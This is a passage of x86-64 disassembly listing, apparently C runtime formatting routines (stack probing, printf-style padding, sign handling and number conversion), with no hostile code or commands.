   32c482496:	48 83 09 00          	orq    $0x0,(%rcx)
   32c48249a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   32c4824a0:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   32c4824a6:	77 e7                	ja     0x32c48248f
   32c4824a8:	48 29 c1             	sub    %rax,%rcx
   32c4824ab:	48 83 09 00          	orq    $0x0,(%rcx)
   32c4824af:	58                   	pop    %rax
   32c4824b0:	59                   	pop    %rcx
   32c4824b1:	c3                   	ret
   32c4824b2:	90                   	nop
   32c4824b3:	90                   	nop
   32c4824b4:	90                   	nop
   32c4824b5:	90                   	nop
   32c4824b6:	90                   	nop
   32c4824b7:	90                   	nop
   32c4824b8:	90                   	nop
   32c4824b9:	90                   	nop
   32c4824ba:	90                   	nop
   32c4824bb:	90                   	nop
   32c4824bc:	90                   	nop
   32c4824bd:	90                   	nop
   32c4824be:	90                   	nop
   32c4824bf:	90                   	nop
   32c4824c0:	48 83 ec 38          	sub    $0x38,%rsp
   32c4824c4:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   32c4824c9:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   32c4824ce:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   32c4824d3:	e8 08 00 00 00       	call   0x32c4824e0
   32c4824d8:	48 83 c4 38          	add    $0x38,%rsp
   32c4824dc:	c3                   	ret
   32c4824dd:	90                   	nop
   32c4824de:	90                   	nop
   32c4824df:	90                   	nop
   32c4824e0:	56                   	push   %rsi
   32c4824e1:	53                   	push   %rbx
   32c4824e2:	48 83 ec 38          	sub    $0x38,%rsp
   32c4824e6:	48 89 ce             	mov    %rcx,%rsi
   32c4824e9:	48 85 d2             	test   %rdx,%rdx
   32c4824ec:	74 32                	je     0x32c482520
   32c4824ee:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   32c4824f3:	48 8d 5a ff          	lea    -0x1(%rdx),%rbx
   32c4824f7:	4d 89 c1             	mov    %r8,%r9
   32c4824fa:	48 89 ca             	mov    %rcx,%rdx
   32c4824fd:	41 89 d8             	mov    %ebx,%r8d
   32c482500:	31 c9                	xor    %ecx,%ecx
   32c482502:	e8 d9 20 00 00       	call   0x32c4845e0
   32c482507:	89 da                	mov    %ebx,%edx
   32c482509:	39 d8                	cmp    %ebx,%eax
   32c48250b:	0f 4e d0             	cmovle %eax,%edx
   32c48250e:	48 63 d2             	movslq %edx,%rdx
   32c482511:	c6 04 16 00          	movb   $0x0,(%rsi,%rdx,1)
   32c482515:	48 83 c4 38          	add    $0x38,%rsp
   32c482519:	5b                   	pop    %rbx
   32c48251a:	5e                   	pop    %rsi
   32c48251b:	c3                   	ret
   32c48251c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c482520:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   32c482525:	48 89 ca             	mov    %rcx,%rdx
   32c482528:	4d 89 c1             	mov    %r8,%r9
   32c48252b:	31 c9                	xor    %ecx,%ecx
   32c48252d:	45 31 c0             	xor    %r8d,%r8d
   32c482530:	e8 ab 20 00 00       	call   0x32c4845e0
   32c482535:	48 83 c4 38          	add    $0x38,%rsp
   32c482539:	5b                   	pop    %rbx
   32c48253a:	5e                   	pop    %rsi
   32c48253b:	c3                   	ret
   32c48253c:	90                   	nop
   32c48253d:	90                   	nop
   32c48253e:	90                   	nop
   32c48253f:	90                   	nop
   32c482540:	48 83 ec 78          	sub    $0x78,%rsp
   32c482544:	48 8b 02             	mov    (%rdx),%rax
   32c482547:	8b 52 08             	mov    0x8(%rdx),%edx
   32c48254a:	41 89 d2             	mov    %edx,%r10d
   32c48254d:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   32c482552:	41 89 cb             	mov    %ecx,%r11d
   32c482555:	48 89 d1             	mov    %rdx,%rcx
   32c482558:	89 54 24 68          	mov    %edx,0x68(%rsp)
   32c48255c:	f3 0f 6f 44 24 60    	movdqu 0x60(%rsp),%xmm0
   32c482562:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   32c482567:	66 41 81 e2 ff 7f    	and    $0x7fff,%r10w
   32c48256d:	75 71                	jne    0x32c4825e0
   32c48256f:	48 89 c2             	mov    %rax,%rdx
   32c482572:	48 c1 ea 20          	shr    $0x20,%rdx
   32c482576:	09 d0                	or     %edx,%eax
   32c482578:	0f 84 92 00 00 00    	je     0x32c482610
   32c48257e:	85 d2                	test   %edx,%edx
   32c482580:	0f 89 9a 00 00 00    	jns    0x32c482620
   32c482586:	41 8d 92 c2 bf ff ff 	lea    -0x403e(%r10),%edx
   32c48258d:	b8 01 00 00 00       	mov    $0x1,%eax
   32c482592:	0f bf d2             	movswl %dx,%edx
   32c482595:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   32c482599:	81 e1 00 80 00 00    	and    $0x8000,%ecx
   32c48259f:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   32c4825a6:	00 
   32c4825a7:	89 08                	mov    %ecx,(%rax)
   32c4825a9:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   32c4825ae:	48 8d 0d bb 6a 00 00 	lea    0x6abb(%rip),%rcx        # 0x32c489070
   32c4825b5:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   32c4825ba:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   32c4825bf:	44 89 44 24 28       	mov    %r8d,0x28(%rsp)
   32c4825c4:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   32c4825c9:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   32c4825ce:	44 89 5c 24 20       	mov    %r11d,0x20(%rsp)
   32c4825d3:	e8 28 2e 00 00       	call   0x32c485400
   32c4825d8:	48 83 c4 78          	add    $0x78,%rsp
   32c4825dc:	c3                   	ret
   32c4825dd:	0f 1f 00             	nopl   (%rax)
   32c4825e0:	66 41 81 fa ff 7f    	cmp    $0x7fff,%r10w
   32c4825e6:	75 9e                	jne    0x32c482586
   32c4825e8:	48 89 c2             	mov    %rax,%rdx
   32c4825eb:	48 c1 ea 20          	shr    $0x20,%rdx
   32c4825ef:	81 e2 ff ff ff 7f    	and    $0x7fffffff,%edx
   32c4825f5:	09 c2                	or     %eax,%edx
   32c4825f7:	74 37                	je     0x32c482630
   32c4825f9:	c7 44 24 4c 04 00 00 	movl   $0x4,0x4c(%rsp)
   32c482600:	00 
   32c482601:	31 d2                	xor    %edx,%edx
   32c482603:	31 c9                	xor    %ecx,%ecx
   32c482605:	eb 98                	jmp    0x32c48259f
   32c482607:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48260e:	00 00 
   32c482610:	31 c0                	xor    %eax,%eax
   32c482612:	31 d2                	xor    %edx,%edx
   32c482614:	e9 7c ff ff ff       	jmp    0x32c482595
   32c482619:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c482620:	b8 02 00 00 00       	mov    $0x2,%eax
   32c482625:	ba c3 bf ff ff       	mov    $0xffffbfc3,%edx
   32c48262a:	e9 66 ff ff ff       	jmp    0x32c482595
   32c48262f:	90                   	nop
   32c482630:	b8 03 00 00 00       	mov    $0x3,%eax
   32c482635:	31 d2                	xor    %edx,%edx
   32c482637:	e9 59 ff ff ff       	jmp    0x32c482595
   32c48263c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c482640:	48 83 ec 28          	sub    $0x28,%rsp
   32c482644:	49 89 d0             	mov    %rdx,%r8
   32c482647:	8b 52 08             	mov    0x8(%rdx),%edx
   32c48264a:	f6 c6 40             	test   $0x40,%dh
   32c48264d:	75 0a                	jne    0x32c482659
   32c48264f:	41 8b 40 24          	mov    0x24(%r8),%eax
   32c482653:	41 39 40 28          	cmp    %eax,0x28(%r8)
   32c482657:	7e 13                	jle    0x32c48266c
   32c482659:	49 8b 00             	mov    (%r8),%rax
   32c48265c:	80 e6 20             	and    $0x20,%dh
   32c48265f:	75 1f                	jne    0x32c482680
   32c482661:	49 63 50 24          	movslq 0x24(%r8),%rdx
   32c482665:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   32c482668:	41 8b 40 24          	mov    0x24(%r8),%eax
   32c48266c:	83 c0 01             	add    $0x1,%eax
   32c48266f:	41 89 40 24          	mov    %eax,0x24(%r8)
   32c482673:	48 83 c4 28          	add    $0x28,%rsp
   32c482677:	c3                   	ret
   32c482678:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48267f:	00 
   32c482680:	48 89 c2             	mov    %rax,%rdx
   32c482683:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   32c482688:	e8 f3 5d 00 00       	call   0x32c488480
   32c48268d:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   32c482692:	41 8b 40 24          	mov    0x24(%r8),%eax
   32c482696:	83 c0 01             	add    $0x1,%eax
   32c482699:	41 89 40 24          	mov    %eax,0x24(%r8)
   32c48269d:	48 83 c4 28          	add    $0x28,%rsp
   32c4826a1:	c3                   	ret
   32c4826a2:	0f 1f 00             	nopl   (%rax)
   32c4826a5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4826ac:	00 00 00 00 
   32c4826b0:	41 57                	push   %r15
   32c4826b2:	41 56                	push   %r14
   32c4826b4:	41 55                	push   %r13
   32c4826b6:	41 54                	push   %r12
   32c4826b8:	55                   	push   %rbp
   32c4826b9:	57                   	push   %rdi
   32c4826ba:	56                   	push   %rsi
   32c4826bb:	53                   	push   %rbx
   32c4826bc:	48 83 ec 48          	sub    $0x48,%rsp
   32c4826c0:	41 8b 40 10          	mov    0x10(%r8),%eax
   32c4826c4:	89 d6                	mov    %edx,%esi
   32c4826c6:	39 c2                	cmp    %eax,%edx
   32c4826c8:	89 c2                	mov    %eax,%edx
   32c4826ca:	48 89 cd             	mov    %rcx,%rbp
   32c4826cd:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   32c4826d4:	00 00 
   32c4826d6:	0f 4e d6             	cmovle %esi,%edx
   32c4826d9:	85 c0                	test   %eax,%eax
   32c4826db:	41 8b 40 0c          	mov    0xc(%r8),%eax
   32c4826df:	4c 89 c3             	mov    %r8,%rbx
   32c4826e2:	0f 49 f2             	cmovns %edx,%esi
   32c4826e5:	39 f0                	cmp    %esi,%eax
   32c4826e7:	0f 8f ee 00 00 00    	jg     0x32c4827db
   32c4826ed:	41 c7 40 0c ff ff ff 	movl   $0xffffffff,0xc(%r8)
   32c4826f4:	ff 
   32c4826f5:	44 8d 66 ff          	lea    -0x1(%rsi),%r12d
   32c4826f9:	85 f6                	test   %esi,%esi
   32c4826fb:	0f 8e 1c 01 00 00    	jle    0x32c48281d
   32c482701:	31 f6                	xor    %esi,%esi
   32c482703:	41 83 c4 01          	add    $0x1,%r12d
   32c482707:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48270e:	00 00 
   32c482710:	0f b7 54 75 00       	movzwl 0x0(%rbp,%rsi,2),%edx
   32c482715:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   32c48271a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   32c48271f:	e8 bc 58 00 00       	call   0x32c487fe0
   32c482724:	85 c0                	test   %eax,%eax
   32c482726:	0f 8e 91 00 00 00    	jle    0x32c4827bd
   32c48272c:	83 e8 01             	sub    $0x1,%eax
   32c48272f:	4c 8d 74 24 30       	lea    0x30(%rsp),%r14
   32c482734:	4c 8d 7c 04 31       	lea    0x31(%rsp,%rax,1),%r15
   32c482739:	eb 1a                	jmp    0x32c482755
   32c48273b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482740:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   32c482744:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   32c482747:	8b 43 24             	mov    0x24(%rbx),%eax
   32c48274a:	83 c0 01             	add    $0x1,%eax
   32c48274d:	89 43 24             	mov    %eax,0x24(%rbx)
   32c482750:	4d 39 fe             	cmp    %r15,%r14
   32c482753:	74 37                	je     0x32c48278c
   32c482755:	8b 53 08             	mov    0x8(%rbx),%edx
   32c482758:	49 83 c6 01          	add    $0x1,%r14
   32c48275c:	f6 c6 40             	test   $0x40,%dh
   32c48275f:	75 08                	jne    0x32c482769
   32c482761:	8b 43 24             	mov    0x24(%rbx),%eax
   32c482764:	39 43 28             	cmp    %eax,0x28(%rbx)
   32c482767:	7e e1                	jle    0x32c48274a
   32c482769:	41 0f be 4e ff       	movsbl -0x1(%r14),%ecx
   32c48276e:	48 8b 03             	mov    (%rbx),%rax
   32c482771:	80 e6 20             	and    $0x20,%dh
   32c482774:	74 ca                	je     0x32c482740
   32c482776:	48 89 c2             	mov    %rax,%rdx
   32c482779:	e8 02 5d 00 00       	call   0x32c488480
   32c48277e:	8b 43 24             	mov    0x24(%rbx),%eax
   32c482781:	83 c0 01             	add    $0x1,%eax
   32c482784:	89 43 24             	mov    %eax,0x24(%rbx)
   32c482787:	4d 39 fe             	cmp    %r15,%r14
   32c48278a:	75 c9                	jne    0x32c482755
   32c48278c:	48 83 c6 01          	add    $0x1,%rsi
   32c482790:	44 89 e0             	mov    %r12d,%eax
   32c482793:	29 f0                	sub    %esi,%eax
   32c482795:	85 c0                	test   %eax,%eax
   32c482797:	0f 8f 73 ff ff ff    	jg     0x32c482710
   32c48279d:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c4827a0:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c4827a3:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c4827a6:	85 c0                	test   %eax,%eax
   32c4827a8:	7e 20                	jle    0x32c4827ca
   32c4827aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4827b0:	48 89 da             	mov    %rbx,%rdx
   32c4827b3:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c4827b8:	e8 83 fe ff ff       	call   0x32c482640
   32c4827bd:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c4827c0:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c4827c3:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c4827c6:	85 c0                	test   %eax,%eax
   32c4827c8:	7f e6                	jg     0x32c4827b0
   32c4827ca:	48 83 c4 48          	add    $0x48,%rsp
   32c4827ce:	5b                   	pop    %rbx
   32c4827cf:	5e                   	pop    %rsi
   32c4827d0:	5f                   	pop    %rdi
   32c4827d1:	5d                   	pop    %rbp
   32c4827d2:	41 5c                	pop    %r12
   32c4827d4:	41 5d                	pop    %r13
   32c4827d6:	41 5e                	pop    %r14
   32c4827d8:	41 5f                	pop    %r15
   32c4827da:	c3                   	ret
   32c4827db:	29 f0                	sub    %esi,%eax
   32c4827dd:	41 89 40 0c          	mov    %eax,0xc(%r8)
   32c4827e1:	41 f6 40 09 04       	testb  $0x4,0x9(%r8)
   32c4827e6:	75 28                	jne    0x32c482810
   32c4827e8:	83 e8 01             	sub    $0x1,%eax
   32c4827eb:	41 89 40 0c          	mov    %eax,0xc(%r8)
   32c4827ef:	90                   	nop
   32c4827f0:	48 89 da             	mov    %rbx,%rdx
   32c4827f3:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c4827f8:	e8 43 fe ff ff       	call   0x32c482640
   32c4827fd:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c482800:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c482803:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c482806:	85 c0                	test   %eax,%eax
   32c482808:	75 e6                	jne    0x32c4827f0
   32c48280a:	85 f6                	test   %esi,%esi
   32c48280c:	7f 06                	jg     0x32c482814
   32c48280e:	eb ad                	jmp    0x32c4827bd
   32c482810:	85 f6                	test   %esi,%esi
   32c482812:	7e 12                	jle    0x32c482826
   32c482814:	44 8d 66 ff          	lea    -0x1(%rsi),%r12d
   32c482818:	e9 e4 fe ff ff       	jmp    0x32c482701
   32c48281d:	c7 43 0c fe ff ff ff 	movl   $0xfffffffe,0xc(%rbx)
   32c482824:	eb a4                	jmp    0x32c4827ca
   32c482826:	83 6b 0c 01          	subl   $0x1,0xc(%rbx)
   32c48282a:	eb 84                	jmp    0x32c4827b0
   32c48282c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c482830:	57                   	push   %rdi
   32c482831:	56                   	push   %rsi
   32c482832:	53                   	push   %rbx
   32c482833:	48 83 ec 20          	sub    $0x20,%rsp
   32c482837:	41 8b 40 10          	mov    0x10(%r8),%eax
   32c48283b:	89 c7                	mov    %eax,%edi
   32c48283d:	39 c2                	cmp    %eax,%edx
   32c48283f:	48 89 ce             	mov    %rcx,%rsi
   32c482842:	4c 89 c3             	mov    %r8,%rbx
   32c482845:	0f 4e fa             	cmovle %edx,%edi
   32c482848:	85 c0                	test   %eax,%eax
   32c48284a:	41 8b 40 0c          	mov    0xc(%r8),%eax
   32c48284e:	0f 48 fa             	cmovs  %edx,%edi
   32c482851:	39 f8                	cmp    %edi,%eax
   32c482853:	7f 6b                	jg     0x32c4828c0
   32c482855:	41 c7 40 0c ff ff ff 	movl   $0xffffffff,0xc(%r8)
   32c48285c:	ff 
   32c48285d:	85 ff                	test   %edi,%edi
   32c48285f:	0f 84 f7 00 00 00    	je     0x32c48295c
   32c482865:	8b 43 08             	mov    0x8(%rbx),%eax
   32c482868:	83 ef 01             	sub    $0x1,%edi
   32c48286b:	83 c7 01             	add    $0x1,%edi
   32c48286e:	48 01 f7             	add    %rsi,%rdi
   32c482871:	eb 21                	jmp    0x32c482894
   32c482873:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482878:	48 63 43 24          	movslq 0x24(%rbx),%rax
   32c48287c:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   32c48287f:	8b 53 24             	mov    0x24(%rbx),%edx
   32c482882:	83 c2 01             	add    $0x1,%edx
   32c482885:	89 53 24             	mov    %edx,0x24(%rbx)
   32c482888:	48 39 fe             	cmp    %rdi,%rsi
   32c48288b:	0f 84 88 00 00 00    	je     0x32c482919
   32c482891:	8b 43 08             	mov    0x8(%rbx),%eax
   32c482894:	48 83 c6 01          	add    $0x1,%rsi
   32c482898:	f6 c4 40             	test   $0x40,%ah
   32c48289b:	75 08                	jne    0x32c4828a5
   32c48289d:	8b 53 24             	mov    0x24(%rbx),%edx
   32c4828a0:	39 53 28             	cmp    %edx,0x28(%rbx)
   32c4828a3:	7e dd                	jle    0x32c482882
   32c4828a5:	0f be 4e ff          	movsbl -0x1(%rsi),%ecx
   32c4828a9:	48 8b 13             	mov    (%rbx),%rdx
   32c4828ac:	f6 c4 20             	test   $0x20,%ah
   32c4828af:	74 c7                	je     0x32c482878
   32c4828b1:	e8 ca 5b 00 00       	call   0x32c488480
   32c4828b6:	8b 53 24             	mov    0x24(%rbx),%edx
   32c4828b9:	eb c7                	jmp    0x32c482882
   32c4828bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4828c0:	29 f8                	sub    %edi,%eax
   32c4828c2:	41 89 40 0c          	mov    %eax,0xc(%r8)
   32c4828c6:	89 c2                	mov    %eax,%edx
   32c4828c8:	41 8b 40 08          	mov    0x8(%r8),%eax
   32c4828cc:	f6 c4 04             	test   $0x4,%ah
   32c4828cf:	75 7f                	jne    0x32c482950
   32c4828d1:	8d 42 ff             	lea    -0x1(%rdx),%eax
   32c4828d4:	41 89 40 0c          	mov    %eax,0xc(%r8)
   32c4828d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4828df:	00 
   32c4828e0:	48 89 da             	mov    %rbx,%rdx
   32c4828e3:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c4828e8:	e8 53 fd ff ff       	call   0x32c482640
   32c4828ed:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c4828f0:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c4828f3:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c4828f6:	85 c0                	test   %eax,%eax
   32c4828f8:	75 e6                	jne    0x32c4828e0
   32c4828fa:	85 ff                	test   %edi,%edi
   32c4828fc:	74 1b                	je     0x32c482919
   32c4828fe:	8b 43 08             	mov    0x8(%rbx),%eax
   32c482901:	eb 51                	jmp    0x32c482954
   32c482903:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482908:	48 63 43 24          	movslq 0x24(%rbx),%rax
   32c48290c:	c6 04 02 20          	movb   $0x20,(%rdx,%rax,1)
   32c482910:	8b 53 24             	mov    0x24(%rbx),%edx
   32c482913:	83 c2 01             	add    $0x1,%edx
   32c482916:	89 53 24             	mov    %edx,0x24(%rbx)
   32c482919:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c48291c:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c48291f:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c482922:	85 c0                	test   %eax,%eax
   32c482924:	7e 3d                	jle    0x32c482963
   32c482926:	8b 43 08             	mov    0x8(%rbx),%eax
   32c482929:	f6 c4 40             	test   $0x40,%ah
   32c48292c:	75 08                	jne    0x32c482936
   32c48292e:	8b 53 24             	mov    0x24(%rbx),%edx
   32c482931:	39 53 28             	cmp    %edx,0x28(%rbx)
   32c482934:	7e dd                	jle    0x32c482913
   32c482936:	48 8b 13             	mov    (%rbx),%rdx
   32c482939:	f6 c4 20             	test   $0x20,%ah
   32c48293c:	74 ca                	je     0x32c482908
   32c48293e:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c482943:	e8 38 5b 00 00       	call   0x32c488480
   32c482948:	8b 53 24             	mov    0x24(%rbx),%edx
   32c48294b:	eb c6                	jmp    0x32c482913
   32c48294d:	0f 1f 00             	nopl   (%rax)
   32c482950:	85 ff                	test   %edi,%edi
   32c482952:	74 17                	je     0x32c48296b
   32c482954:	83 ef 01             	sub    $0x1,%edi
   32c482957:	e9 0f ff ff ff       	jmp    0x32c48286b
   32c48295c:	c7 43 0c fe ff ff ff 	movl   $0xfffffffe,0xc(%rbx)
   32c482963:	48 83 c4 20          	add    $0x20,%rsp
   32c482967:	5b                   	pop    %rbx
   32c482968:	5e                   	pop    %rsi
   32c482969:	5f                   	pop    %rdi
   32c48296a:	c3                   	ret
   32c48296b:	83 6b 0c 01          	subl   $0x1,0xc(%rbx)
   32c48296f:	eb b8                	jmp    0x32c482929
   32c482971:	0f 1f 40 00          	nopl   0x0(%rax)
   32c482975:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48297c:	00 00 00 00 
   32c482980:	56                   	push   %rsi
   32c482981:	53                   	push   %rbx
   32c482982:	48 83 ec 28          	sub    $0x28,%rsp
   32c482986:	48 8d 05 93 96 00 00 	lea    0x9693(%rip),%rax        # 0x32c48c020
   32c48298d:	48 85 c9             	test   %rcx,%rcx
   32c482990:	48 89 d6             	mov    %rdx,%rsi
   32c482993:	48 63 52 10          	movslq 0x10(%rdx),%rdx
   32c482997:	48 0f 45 c1          	cmovne %rcx,%rax
   32c48299b:	48 89 c3             	mov    %rax,%rbx
   32c48299e:	48 89 c1             	mov    %rax,%rcx
   32c4829a1:	85 d2                	test   %edx,%edx
   32c4829a3:	78 1b                	js     0x32c4829c0
   32c4829a5:	e8 d6 55 00 00       	call   0x32c487f80
   32c4829aa:	49 89 f0             	mov    %rsi,%r8
   32c4829ad:	89 c2                	mov    %eax,%edx
   32c4829af:	48 89 d9             	mov    %rbx,%rcx
   32c4829b2:	48 83 c4 28          	add    $0x28,%rsp
   32c4829b6:	5b                   	pop    %rbx
   32c4829b7:	5e                   	pop    %rsi
   32c4829b8:	e9 73 fe ff ff       	jmp    0x32c482830
   32c4829bd:	0f 1f 00             	nopl   (%rax)
   32c4829c0:	e8 eb 5a 00 00       	call   0x32c4884b0
   32c4829c5:	eb e3                	jmp    0x32c4829aa
   32c4829c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4829ce:	00 00 
   32c4829d0:	48 83 ec 38          	sub    $0x38,%rsp
   32c4829d4:	b8 2d 00 00 00       	mov    $0x2d,%eax
   32c4829d9:	45 8b 50 08          	mov    0x8(%r8),%r10d
   32c4829dd:	41 c7 40 10 ff ff ff 	movl   $0xffffffff,0x10(%r8)
   32c4829e4:	ff 
   32c4829e5:	85 c9                	test   %ecx,%ecx
   32c4829e7:	74 47                	je     0x32c482a30
   32c4829e9:	88 44 24 2c          	mov    %al,0x2c(%rsp)
   32c4829ed:	4c 8d 4c 24 2d       	lea    0x2d(%rsp),%r9
   32c4829f2:	4c 8d 5c 24 2c       	lea    0x2c(%rsp),%r11
   32c4829f7:	41 83 e2 20          	and    $0x20,%r10d
   32c4829fb:	31 c9                	xor    %ecx,%ecx
   32c4829fd:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   32c482a01:	83 e0 df             	and    $0xffffffdf,%eax
   32c482a04:	44 09 d0             	or     %r10d,%eax
   32c482a07:	41 88 04 09          	mov    %al,(%r9,%rcx,1)
   32c482a0b:	48 83 c1 01          	add    $0x1,%rcx
   32c482a0f:	48 83 f9 03          	cmp    $0x3,%rcx
   32c482a13:	75 e8                	jne    0x32c4829fd
   32c482a15:	49 8d 51 03          	lea    0x3(%r9),%rdx
   32c482a19:	4c 89 d9             	mov    %r11,%rcx
   32c482a1c:	44 29 da             	sub    %r11d,%edx
   32c482a1f:	e8 0c fe ff ff       	call   0x32c482830
   32c482a24:	90                   	nop
   32c482a25:	48 83 c4 38          	add    $0x38,%rsp
   32c482a29:	c3                   	ret
   32c482a2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c482a30:	41 f7 c2 00 01 00 00 	test   $0x100,%r10d
   32c482a37:	74 07                	je     0x32c482a40
   32c482a39:	b8 2b 00 00 00       	mov    $0x2b,%eax
   32c482a3e:	eb a9                	jmp    0x32c4829e9
   32c482a40:	41 f6 c2 40          	test   $0x40,%r10b
   32c482a44:	74 0a                	je     0x32c482a50
   32c482a46:	b8 20 00 00 00       	mov    $0x20,%eax
   32c482a4b:	eb 9c                	jmp    0x32c4829e9
   32c482a4d:	0f 1f 00             	nopl   (%rax)
   32c482a50:	4c 8d 5c 24 2c       	lea    0x2c(%rsp),%r11
   32c482a55:	4d 89 d9             	mov    %r11,%r9
   32c482a58:	eb 9d                	jmp    0x32c4829f7
   32c482a5a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c482a60:	55                   	push   %rbp
   32c482a61:	41 57                	push   %r15
   32c482a63:	41 56                	push   %r14
   32c482a65:	41 55                	push   %r13
   32c482a67:	41 54                	push   %r12
   32c482a69:	57                   	push   %rdi
   32c482a6a:	56                   	push   %rsi
   32c482a6b:	53                   	push   %rbx
   32c482a6c:	48 83 ec 28          	sub    $0x28,%rsp
   32c482a70:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   32c482a75:	31 c0                	xor    %eax,%eax
   32c482a77:	44 8b 6a 10          	mov    0x10(%rdx),%r13d
   32c482a7b:	44 8b 4a 08          	mov    0x8(%rdx),%r9d
   32c482a7f:	45 85 ed             	test   %r13d,%r13d
   32c482a82:	41 0f 49 c5          	cmovns %r13d,%eax
   32c482a86:	48 89 d3             	mov    %rdx,%rbx
   32c482a89:	83 c0 17             	add    $0x17,%eax
   32c482a8c:	41 f7 c1 00 10 00 00 	test   $0x1000,%r9d
   32c482a93:	74 0b                	je     0x32c482aa0
   32c482a95:	66 83 7a 20 00       	cmpw   $0x0,0x20(%rdx)
   32c482a9a:	0f 85 d0 02 00 00    	jne    0x32c482d70
   32c482aa0:	44 8b 5b 0c          	mov    0xc(%rbx),%r11d
   32c482aa4:	41 39 c3             	cmp    %eax,%r11d
   32c482aa7:	41 0f 4d c3          	cmovge %r11d,%eax
   32c482aab:	48 98                	cltq
   32c482aad:	48 83 c0 0f          	add    $0xf,%rax
   32c482ab1:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   32c482ab5:	e8 c6 f9 ff ff       	call   0x32c482480
   32c482aba:	48 29 c4             	sub    %rax,%rsp
   32c482abd:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   32c482ac2:	41 f6 c1 80          	test   $0x80,%r9b
   32c482ac6:	74 11                	je     0x32c482ad9
   32c482ac8:	48 85 c9             	test   %rcx,%rcx
   32c482acb:	0f 88 df 02 00 00    	js     0x32c482db0
   32c482ad1:	41 80 e1 7f          	and    $0x7f,%r9b
   32c482ad5:	44 89 4b 08          	mov    %r9d,0x8(%rbx)
   32c482ad9:	48 85 c9             	test   %rcx,%rcx
   32c482adc:	0f 84 76 03 00 00    	je     0x32c482e58
   32c482ae2:	49 be 03 00 00 00 00 	movabs $0x8000000000000003,%r14
   32c482ae9:	00 00 80 
   32c482aec:	44 89 ce             	mov    %r9d,%esi
   32c482aef:	49 89 f8             	mov    %rdi,%r8
   32c482af2:	49 ba cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r10
   32c482af9:	cc cc cc 
   32c482afc:	81 e6 00 10 00 00    	and    $0x1000,%esi
   32c482b02:	0f 1f 00             	nopl   (%rax)
   32c482b05:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c482b0c:	00 00 00 00 
   32c482b10:	4c 39 c7             	cmp    %r8,%rdi
   32c482b13:	74 2b                	je     0x32c482b40
   32c482b15:	85 f6                	test   %esi,%esi
   32c482b17:	74 27                	je     0x32c482b40
   32c482b19:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   32c482b1e:	74 20                	je     0x32c482b40
   32c482b20:	4c 89 c0             	mov    %r8,%rax
   32c482b23:	48 29 f8             	sub    %rdi,%rax
   32c482b26:	4c 21 f0             	and    %r14,%rax
